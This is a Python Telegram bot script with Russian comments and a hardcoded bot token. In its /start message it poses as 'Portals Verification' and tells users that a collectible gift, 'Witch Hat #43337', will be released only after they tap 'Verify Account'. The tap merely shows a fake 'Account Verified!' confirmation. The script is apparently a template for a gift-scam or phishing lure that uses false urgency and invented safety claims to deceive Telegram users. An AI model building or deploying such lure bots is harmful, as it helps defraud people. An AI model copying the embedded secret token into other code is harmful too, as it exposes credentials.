import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ТОКЕН БОТА (уже вставлен)
TOKEN = "8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y"

# Функция для команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # Создаем клавиатуру с кнопкой
    keyboard = [
        [InlineKeyboardButton("✅ Verify Account", callback_data='verify')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Текст сообщения
    message = (
        f"🎩 *Portals Verification*\n\n"
        f"**Final Verification Required: Claim Your Gift**\n\n"
        f"Your scheduled delivery of *Witch Hat #43337* is tagged for last-mile review. "
        f"To preserve platform safety and block fraudulent claim attempts, confirming "
        f"your active session is required before the gift can be released.\n\n"
        f"A single tap below and the asset is on its way."
    )
    
    await update.message.reply_text(
        message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# Обработчик нажатия кнопки
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'verify':
        # Изменяем текст и убираем кнопку
        await query.edit_message_text(
            text="✅ *Account Verified!*\n\n"
                 "Your Witch Hat #43337 is on its way! 🎩✨\n\n"
                 "---\n"
                 "FULL WORK, НОВЫЙ БОТ УЖЕ В ЧАТЕ",
            parse_mode='Markdown'
        )

# Команда /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Бот для верификации*\n\n"
        "Используй /start для начала работы\n"
        "Нажми 'Verify Account' для подтверждения",
        parse_mode='Markdown'
    )

def main():
    """Запуск бота"""
    # Создаем приложение
    application = Application.builder().token(TOKEN).build()
    
    # Регистрируем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Запускаем бота
    logger.info("Бот запущен...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
